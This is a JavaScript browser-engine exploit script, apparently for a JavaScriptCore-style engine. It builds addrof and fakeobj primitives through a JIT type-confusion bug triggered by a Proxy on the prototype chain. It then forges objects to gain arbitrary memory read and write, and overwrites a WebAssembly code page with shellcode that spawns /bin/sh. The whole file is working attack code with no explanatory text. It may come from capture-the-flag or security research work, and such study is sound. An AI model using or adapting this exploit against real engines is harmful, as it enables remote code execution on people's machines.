var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

function hex(addr){
    return addr.toString(16);
}

let arrays = [];
let regexp = new RegExp();
let leakme = [{}];
let jit_mode = 0;

var global_arr = [1.1, 2.2];


const MAX_ARRAYS = 100;
for (let i = 0; i < MAX_ARRAYS; i++) {
  arrays.push([1.1, 2.2]);
}
for (let i = 0; i < MAX_ARRAYS; i++) {
  arrays[i].__proto__ = regexp;
}

regexp.__proto__.__proto__ = new Proxy({}, {
  has() {
    if (jit_mode === 0) {
      global_arr[0] = leakme[0];
    }
    else if (jit_mode === 1) {
      global_arr[1] = {};
    }
    return true;
  }
});

function addrof(obj){
    function leak_opt(arr, arr2) {
      let tmp = 0 in arr2;
      return [tmp, arr[0]];
    }
    jit_mode = 0;
    global_arr=[1.1,2.2];
    leakme[0]= obj;
    let arr = arrays.pop();
    for (let i = 0; i < 10000; i++) {
      leak_opt(global_arr, arr);
    }
    delete arr[0];
    return f2i(leak_opt(global_arr,arr)[1])
}

function fakeobj(addr){
    function fake_opt(arr,arr2,fake_addr){
        let tmp = 0 in arr2;
        arr[1] =  fakeme;
        return tmp;
    }
    jit_mode = 1;
    global_arr = [1.1,2.2];
    let fakeme = i2f(addr);
    let arr = arrays.pop();
    for(let i=0;i<10000;i++){
        fake_opt(global_arr,arr,fakeme);
    }
    delete arr[0];
    fake_opt(global_arr,arr,fakeme);
    return global_arr[1];
}



let a=[13.37,13.37];
a[0]={};
print(addrof(a).toString(16))
var arr_leak = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
function leakid(){
    var unlinked_function_executable = {
        m_isBuitinFunction: i2f(0xdeadbeef),
        pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
        m_identifier: {},
    };
    
    var fake_function_executable = {
      pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
      m_executable: unlinked_function_executable,
    };
    
    var container = {
      jscell: i2f(0x00001a0000000000),
      btfly: {},
      pad: 0,
      m_functionExecutable: fake_function_executable,
    };

    var fake_addr = addrof(container)+0x10;
    fake_o = fakeobj(fake_addr);
    unlinked_function_executable.m_identifier = fake_o; 
    container.btfly = arr_leak; 
    var name_str = Function.prototype.toString.call(fake_o);
    return name_str.charCodeAt(9); 

}

var victim=[13.37];
victim[0]=13.37;
victim['prop']=13.37;
victim['prop1']=13.37;
var id = leakid();

i32[0]=id;
i32[1]=0x01082307 -  0x20000;
var container={
    JSCell: f64[0],
    butterfly: victim,
};
container_addr = addrof(container);

hax = fakeobj(container_addr+0x10)
print(describe(container))

var unboxed = [1.1];
unboxed[0]=3.3;

var boxed = [{}];

print('-----')
print(describe(unboxed))
print(describe(boxed))
print('-----')
hax[1] = i2f(addrof(unboxed));
var shared = victim[1];
hax[1] = i2f(addrof(boxed))
victim[1] = shared;
print(describe(unboxed))
print(describe(boxed))



var stage2={
    addrof: function(obj){
        boxed[0]=obj;
        return f2i(unboxed[0])
    },
    fakeobj: function(addr){
        unboxed[0]=i2f(addr)
        return boxed[0]
    },
    read64:function(addr){
        hax[1]=i2f(addr+0x10)
        return this.addrof(victim.prop)
    },
    write64:function(addr,data){
        hax[1]=i2f(addr+0x10)
        victim.prop = this.fakeobj(data)
    },
    write: function(addr, shellcode) {
        var theAddr = addr;
        for(var i=0;i<shellcode.length;i++){
            this.write64(addr+i,shellcode[i].charCodeAt())
        }
    },
    pwn:function(){
        var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
        var wasm_mod = new WebAssembly.Module(wasm_code);
        var wasm_instance = new WebAssembly.Instance(wasm_mod);
        var f = wasm_instance.exports.main;
        var addr_f = this.addrof(f);
        var addr_p = this.read64(addr_f + 0x48);
        var addr_shellcode = this.read64(addr_p);
        print(hex(addr_f))
        print(hex(addr_shellcode))
        shellcode = "j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05"
        this.write(addr_shellcode, shellcode);
        f();
    },

};

stage2.pwn()
